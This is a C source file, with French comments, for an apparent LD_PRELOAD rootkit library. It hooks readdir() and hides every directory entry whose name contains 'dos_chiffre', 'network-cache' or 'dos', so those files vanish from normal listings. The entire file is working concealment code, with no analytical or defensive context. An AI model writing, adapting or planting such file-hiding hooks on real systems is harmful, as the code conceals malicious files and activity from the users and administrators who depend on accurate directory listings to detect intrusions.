#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

typedef struct dirent* (*orig_readdir_t)(DIR*);

struct dirent* readdir(DIR* dirp) {
    // Initialiser la fonction originale
    static orig_readdir_t orig_readdir = NULL;
    if (!orig_readdir) {
        orig_readdir = dlsym(RTLD_NEXT, "readdir");
        if (!orig_readdir) {
            fprintf(stderr, "Erreur lors du chargement de readdir: %s\n", dlerror());
            return NULL;
        }
    }
    
    // Lire les entrées du répertoire
    struct dirent* dir;
    while ((dir = orig_readdir(dirp)) != NULL) {
        // Masquer les fichiers contenant ces chaînes
        if (strstr(dir->d_name, "dos_chiffre") || 
            strstr(dir->d_name, "network-cache") ||
            strstr(dir->d_name, "dos")) {
            continue; // Ignorer cette entrée
        }
        return dir;
    }
    return NULL;
}
